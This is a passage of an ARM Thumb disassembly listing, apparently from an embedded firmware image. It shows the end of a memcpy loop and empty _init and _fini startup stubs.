 800d09e:	f803 4f01 	strb.w	r4, [r3, #1]!
 800d0a2:	4291      	cmp	r1, r2
 800d0a4:	d1f9      	bne.n	800d09a <memcpy+0xe>
 800d0a6:	bd10      	pop	{r4, pc}

0800d0a8 <_init>:
 800d0a8:	b5f8      	push	{r3, r4, r5, r6, r7, lr}
 800d0aa:	bf00      	nop
 800d0ac:	bcf8      	pop	{r3, r4, r5, r6, r7}
 800d0ae:	bc08      	pop	{r3}
 800d0b0:	469e      	mov	lr, r3
 800d0b2:	4770      	bx	lr

0800d0b4 <_fini>:
 800d0b4:	b5f8      	push	{r3, r4, r5, r6, r7, lr}
 800d0b6:	bf00      	nop
 800d0b8:	bcf8      	pop	{r3, r4, r5, r6, r7}
 800d0ba:	bc08      	pop	{r3}
 800d0bc:	469e      	mov	lr, r3
 800d0be:	4770      	bx	lr
